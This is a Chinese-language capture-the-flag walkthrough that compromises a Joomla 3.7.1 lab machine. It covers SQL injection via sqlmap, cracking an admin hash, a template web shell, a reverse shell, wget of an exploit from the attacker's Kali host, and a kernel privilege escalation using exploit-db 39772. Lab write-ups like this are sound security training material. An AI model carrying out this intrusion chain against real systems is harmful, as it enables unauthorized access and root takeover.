
扫端口 发现只有80端口开放，进入网站发现，是个需要用户名和密码登陆的网站，因为输入账号密码不完全对的话，都是回显账号或密码错误，枚举不了用户名，如果用未知用户名和未知密码做组合去爆破太浪费时间了，所以放弃爆破这条路。本人手工sql注入水平不够，无法注入。

然后用dirsearch 扫一下目录，发现有个后台登陆页面，cms也写在那个登陆页面上了，是joomla,只不过没有版本号，用joomscan这个工具去扫描，joomscan --usr http://192.168.18.139, 可以得到版本信息；然后用searchsploit -t joomla 3.7.1 去搜索漏洞 发现存在一个报错注入的漏洞poc，直接用看用法用sqlmap去打了，最后得到一个用户名admin和一个用crypto加密的密码，先把密文写入文本 echo 密文 >pp.txt（echo命令 的 > 会覆盖原有文本内容  >> 则是追加 ）

用hash -m **3200** pp.txt **/usr/share/wordlists/rockyou.txt** 去破解出密码为snoopy

登陆到后台发现，可以添加模板，也可以文件上传，但是有服务器校验，我不知道怎么绕过，所以选择添加模板，这里需要去查看joomla这个cms的模板放在那个目录，（这些cms的模板都会有一个固定的存放目录的），才可以去用蚁剑连接，这里没有直接写普通反弹shell,因为网页的bash受限太多，无反应，试过了,所以不要认为自己反弹代码打错了；

连接上后，在蚁剑打开虚拟终端，我是在这个时候发现普通反弹没用的，所以写了个**管道反弹命令**，具体请看**反弹shell思路**文件夹；

获得bash后，先用**python3 -c 'import pty; pty.spawn(binbash)'** 命令开启有交互的伪终端终端，限制不变，然后export TERM=xter 设置终端类型，就可以用clear命令了。

然后用cat /etc/issue查看发行系统版本，因为要利用系统漏洞进行提权， uname -a 查看内核版本；

知道后去searchploit 去搜，发现只有39772.txt这个能用，因为我已经试了4个不行了，看使用教程，要去下载文件，直接去反弹的shell下载到靶机上

```txt
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

如果下载不了的话可以先下载到kail, 

（然后用**python3 http.server** 端口号 把当前文件夹作为一个web服务器，在靶机上用wget http://kali的ip:端口号  从那个文件夹下载该压缩包，

从kail下载脚本文件打靶机也是刚才那个操作，下载到靶机后需要进行编译 gcc 脚本名.c -o 脚本名 -Ipthread 

-o output 即输出到指定文件 -Ipthread参数是该c利用程序调用了Ipthread库，要用多线程链接编译，否则报错，如果在头文件没看到include<Iptread.c>就不用-Ipthread参数）

回到下载的39772.zip,先解压 unzip 39772.zip 然后解包 tar -xvf 39772.tar 看使用说明：先打开执行          /exploit.tar/ebpf_mapfd_doubleput/compile.sh 然后执行/ebpf_mapfd_doubleput/doubleput.c

doubleput.c需要先编译再执行，编译后执行发现没有x权限，直接 chmod 777 doubleput

等一下后便能提升为root

cd /root   ls 发现flag

